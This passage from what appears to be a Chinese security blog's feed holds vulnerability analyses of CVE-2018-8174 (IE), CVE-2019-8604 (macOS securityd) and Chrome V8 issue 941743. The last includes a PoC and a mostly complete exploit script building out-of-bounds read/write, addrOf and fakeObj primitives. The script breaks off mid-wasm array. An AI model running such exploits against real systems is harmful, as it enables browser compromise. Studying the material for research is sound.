<p>代码流将按相应大小跳转到一个“函数指针数组”的结构。当类型为0x4d，将VARIANT中的值域压栈保存，并将该值域解析成vfTable，随后发生调用，可以成功劫持eip。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSYSAPI　NTSTATUS　NTAPI <span class="title">ZwContinue</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        IN PCONTEXT Context; </span></span></span><br><span class="line"><span class="function"><span class="params">        IN BOOLEAN TestAlert</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这个函数调用时context参数可控，所以可以劫持流程，跳转到rop+shellcode里。</p>
<p><strong>这种做法可以bypass CFG</strong></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP">exp from github</a></p>
<p><a href="https://bbs.pediy.com/thread-249933.htm">[原创]“深入”探索CVE-2018-8174</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>IE</tag>
        <tag>office</tag>
        <tag>vbs</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-8604 analysis</title>
    <url>/2019/09/02/CVE-2019-8604-analysis/</url>
    <content><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Available for: macOS Sierra 10.12.6, macOS High Sierra 10.13.6, macOS Mojave 10.14.4</span><br><span class="line"></span><br><span class="line">Impact: An application may be able to execute arbitrary code with system privileges</span><br><span class="line"></span><br><span class="line">Description: A memory corruption issue was addressed with improved memory handling.</span><br><span class="line"></span><br><span class="line">CVE-2019-8604: Fluoroacetate working with Trend Micro&#39;s Zero Day Initiative</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>zdi的描述:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This vulnerability allows remote attackers to escape the sandbox on affected installations of Apple Safari. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the securityd service. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this in conjunction with other vulnerabilities to execute code under the context of the current user.</span><br></pre></td></tr></table></figure>

<p>还是zdi的描述详细，苹果的描述真的是不怎么可信。</p>
<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p>两种找到这个洞的方式，靠diff或者沿着这个描述尝试挖。</p>
<p>我首先试了试diff，因为我用的是 <code>10.14.3</code>和<code>10.14.6</code>，变化有点大，diff真的不好使。</p>
<p>所以我选择了第二种方式。 既然是直接获取了长度并使用，那就先确定该服务使用的ipc方式，然后找获取数据的函数的xref，然后一个一个看，没一会儿就能看到这个可疑的地方了：</p>
<p>10.14.3</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_100053185</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *source; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">size_t</span> length; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">size_t</span> v8; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = xpc_dictionary_get_string(a3, <span class="string">&quot;_item_name&quot;</span>);</span><br><span class="line">  source = (<span class="keyword">const</span> <span class="keyword">void</span> *)xpc_dictionary_get_data(v3, <span class="string">&quot;_item_value&quot;</span>, &amp;v11);</span><br><span class="line">  <span class="keyword">if</span> ( xpc_dictionary_get_value(v3, <span class="string">&quot;_item_sensitive_value_length&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    length = xpc_dictionary_get_uint64(v3, <span class="string">&quot;_item_sensitive_value_length&quot;</span>);</span><br><span class="line">    v7 = <span class="built_in">malloc</span>(length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, source, length);</span><br><span class="line">    memset_s(source, v11, <span class="number">0L</span>L, length);</span><br><span class="line">    v11 = length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11;</span><br><span class="line">    v7 = <span class="built_in">malloc</span>(v11);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, source, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = xpc_dictionary_get_uint64(v3, <span class="string">&quot;_item_flags&quot;</span>);</span><br><span class="line">  sub_100005588(&amp;v12, v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, v7, v9);</span><br><span class="line">  sub_1000532D4(*(_QWORD *)(a1 + <span class="number">32</span>), &amp;v12, &amp;v12);</span><br><span class="line">  <span class="built_in">free</span>(v7);</span><br><span class="line">  sub_10005222C(&amp;v12);</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( __stack_chk_guard == v13 )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>copy的length可控，dst是根据用户的length分配的，但是source不一定有那么大，length又没有check，所以就越界读了。</p>
<h2 id="patch-by-diff"><a href="#patch-by-diff" class="headerlink" title="patch by diff"></a>patch by diff</h2><p>10.14.6</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_10004405C</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r15</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v6; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 length; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v8; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">size_t</span> v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">size_t</span> data_length; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v18; <span class="comment">// [rsp+24h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+70h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v5 = xpc_dictionary_get_string(a3, <span class="string">&quot;_item_name&quot;</span>);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">void</span> *)xpc_dictionary_get_data(v3, <span class="string">&quot;_item_value&quot;</span>, &amp;data_length);</span><br><span class="line">  <span class="keyword">if</span> ( !xpc_dictionary_get_value(v3, <span class="string">&quot;_item_sensitive_value_length&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = v5;</span><br><span class="line">    v11 = data_length;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(data_length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v12, v6, v11);</span><br><span class="line">LABEL_7:</span><br><span class="line">    v13 = xpc_dictionary_get_uint64(v3, <span class="string">&quot;_item_flags&quot;</span>);</span><br><span class="line">    sub_1000045A2(&amp;v17, v15, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)data_length, v12, v13);</span><br><span class="line">    sub_10004422A(*(_QWORD *)(v4 + <span class="number">32</span>), &amp;v17, &amp;v17);</span><br><span class="line">    <span class="built_in">free</span>(v12);</span><br><span class="line">    sub_10004306E(&amp;v17);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  length = xpc_dictionary_get_uint64(v3, <span class="string">&quot;_item_sensitive_value_length&quot;</span>);</span><br><span class="line">  v8 = length;</span><br><span class="line">  v9 = data_length;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= data_length )                  <span class="comment">// add length check</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15 = v5;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(length);</span><br><span class="line">    <span class="built_in">memcpy</span>(v12, v6, v8);</span><br><span class="line">    memset_s(v6, v9, <span class="number">0L</span>L, v8);</span><br><span class="line">    data_length = v8;</span><br><span class="line">    v4 = a1;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = sub_100093B1E(<span class="string">&quot;SecurityAgentXPCQuery&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)os_log_type_enabled(v10, <span class="number">0L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">134217984</span>;</span><br><span class="line">    v18 = v8;</span><br><span class="line">    _os_log_impl(&amp;_mh_execute_header, v10, <span class="number">0L</span>L, aSensitiveDataL, &amp;v17, <span class="number">12L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( __stack_chk_guard == v19 )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取了要copy的data的长度，并且检查了用户传递来的size是不是小于等于这个值，之后再拷贝。</p>
<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-19-766/">ZDI-19-766</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome M73 issue 941743</title>
    <url>/2020/06/20/Chrome-M73-issue-941743/</url>
    <content><![CDATA[<h2 id="1-bug-info"><a href="#1-bug-info" class="headerlink" title="1. bug info"></a>1. bug info</h2><p>这是科恩实验室19年 blackhat USA议题中那套利用的rce部分，v8 JIT优化的漏洞。</p>
<p>类型混淆漏洞。</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ~/v8/v8/out/x64.debug/d8    ~/chrome_M73_crbug941743_RCE/raw_poc.js </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fatal error in ../../src/elements.cc, line 881</span></span><br><span class="line"><span class="comment"># Debug check failed: IsFastElementsKind(from_kind).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#FailureMessage Object: 0x7fff3b6caa70</span></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f95be106e1e]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libplatform.so(+0x2d527) [0x7f95be0ac527]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f95be0f4fb8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(+0x349fc) [0x7f95be0f49fc]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f95be0f5092]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1585f80) [0x7f95bcf27f80]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1582a31) [0x7f95bcf24a31]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1a8b5b8) [0x7f95bd42d5b8]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(v8::internal::Runtime_TransitionElementsKind(int, unsigned long*, v8::internal::Isolate*)+0x117) [0x7f95bd42d247]</span><br><span class="line">    /home/jack/v8/v8/out/x64.debug/libv8.so(+0x212bd00) [0x7f95bdacdd00]</span><br><span class="line">Received signal 4 ILL_ILLOPN 7f95be104581</span><br><span class="line">[1]    8542 illegal hardware instruction (core dumped)  ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js</span><br></pre></td></tr></table></figure>


<h2 id="2-poc"><a href="#2-poc" class="headerlink" title="2. poc"></a>2. poc</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Impact version: 6.1.462+ </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">300</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> a2 = arr.map(<span class="function"><span class="keyword">function</span> (<span class="params">v, i</span>) </span>&#123;</span><br><span class="line">        arr.push(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    arr.some(arr.constructor);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">1000000</span>; ++j) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. array.map 方法，对array中每个元素执行参数指定的操作，然后返回一个新的数据</span></span><br><span class="line"><span class="string">2. array.some 方法，是一个检测</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](	https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904645923418.jpg)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个patch在这个漏洞修补的commit里是有的，就这个poc：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line"><span class="comment">// Copyright 2019 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --noenable-slow-asserts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapping</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a.map(<span class="function"><span class="params">v</span> =&gt;</span> v);</span><br><span class="line">&#125;</span><br><span class="line">mapping(a);</span><br><span class="line">mapping(a);</span><br><span class="line">%OptimizeFunctionOnNextCall(mapping);</span><br><span class="line">mapping(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">a.push(<span class="number">2</span>);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"><span class="comment">// Now, the non-inlined array constructor should produce an array with</span></span><br><span class="line"><span class="comment">// dictionary elements: causing a crash.</span></span><br><span class="line">mapping(a);</span><br></pre></td></tr></table></figure>

<h2 id="3-bug-analysis"><a href="#3-bug-analysis" class="headerlink" title="3. bug analysis"></a>3. bug analysis</h2><p>作者的分析:</p>
<ol>
<li>The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. </li>
<li>There’s a CheckMaps for |arr|, but it can’t ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. </li>
<li>TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this can’t ensure either. Because when calling to |Runtime_NewArray| and array’s actual length &gt;= 0x4000000, there’ll be a dictionary elements array. So our bug occurs.</li>
</ol>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910826407633.jpg"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904673688147.jpg"></p>
<p><a href="https://cy2cs.top/2020/04/20/issue-941743-cve-2019-5825/">issue-941743-cve-2019-5825</a></p>
<p>为什么开始需要一个<code> Array(2 ** 30)</code></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910830837266.jpg"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (argv.length() == <span class="number">1</span>) &#123;</span><br><span class="line">  Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (argument_one-&gt;IsSmi()) &#123;</span><br><span class="line">    <span class="keyword">int</span> value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value();</span><br><span class="line">    <span class="keyword">if</span> (value &lt; <span class="number">0</span> ||</span><br><span class="line">        JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) &#123;</span><br><span class="line">      <span class="comment">// the array is a dictionary in this case.</span></span><br><span class="line">      can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">      holey = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (value &gt;= JSArray::kInitialMaxFastElementArray) &#123;</span><br><span class="line">        can_inline_array_constructor = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Non-smi length argument produces a dictionary</span></span><br><span class="line">    can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只要<code>can_use_type_feedback = false; </code>即可。</p>
<h2 id="4-how-to-exploit"><a href="#4-how-to-exploit" class="headerlink" title="4. how to exploit?"></a>4. how to exploit?</h2><p>构造<code>oobarray</code>，利用<code>oobarray</code>去修改后面<code>arraybuffer</code>长度用来任意地址读写，利用<code>oobarray</code>读写<code>leak_obj</code>实现<code>addrof</code>和<code>fakeobj</code>原语。s</p>
<h2 id="5-exploit"><a href="#5-exploit" class="headerlink" title="5. exploit"></a>5. exploit</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    exploit for crbug-941743</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">is_in_v8_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// tookit</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="keyword">var</span> g_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> g_float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(g_buffer);</span><br><span class="line"><span class="keyword">var</span> g_uint64 = <span class="keyword">new</span> BigUint64Array(g_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">float2address</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  g_float64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> g_uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address2float</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> i = BigInt(addr);</span><br><span class="line">  g_uint64[<span class="number">0</span>] = i;</span><br><span class="line">  <span class="keyword">return</span> g_float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.toString(<span class="number">16</span>).padStart(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[+] &#x27;</span> + msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[-] &#x27;</span> + msg);</span><br><span class="line">  exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myprint</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_in_v8_flag)&#123;</span><br><span class="line">        print(msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// exploit part</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> max_iters = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">var</span> max_search = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">32760</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array;</span><br><span class="line"><span class="keyword">let</span> leak_obj;</span><br><span class="line"><span class="keyword">let</span> rw_arraybuffer;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;; <span class="comment">//using for leak_obj</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array_length_offset = <span class="number">23</span>;  <span class="comment">// get this by debugging</span></span><br><span class="line"><span class="keyword">let</span> oob_array_storage_length_offset = oob_array_length_offset - <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.map(</span><br><span class="line">        (value, index) =&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)&#123;</span><br><span class="line">                oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">                leak_obj = &#123;<span class="attr">m</span>:address2float(<span class="number">0xdeadbeef</span>), <span class="attr">n</span>:obj&#125;;</span><br><span class="line">                rw_arraybuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x4321</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index == oob_array_length_offset +<span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="string">&quot;oob finished...&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_iters; ++i) inline();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_storage_length_offset, oob_array_storage_length_offset + <span class="number">1</span>);</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_length_offset);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_obj_offset = <span class="number">0</span>;</span><br><span class="line">rw_arraybuffer_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    leak_obj.n = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(oob_array[leak_obj_offset]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">obj_address</span>)</span>&#123;</span><br><span class="line">    oob_array[leak_obj_offset] = <span class="built_in">Number</span>(float2address(obj_address));</span><br><span class="line">    <span class="keyword">return</span> leak_obj.n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(data_view.getFloat64(<span class="number">0</span>, <span class="literal">true</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function write64(addr, value)&#123;</span></span><br><span class="line"><span class="comment">//     oob_array[rw_arraybuffer_offset] = address2float(addr);</span></span><br><span class="line"><span class="comment">//     let data_view = new DataView(rw_arraybuffer);</span></span><br><span class="line"><span class="comment">//     data_view.setFloat64(0, float2address(value), true);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write32</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    data_view.setInt32(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 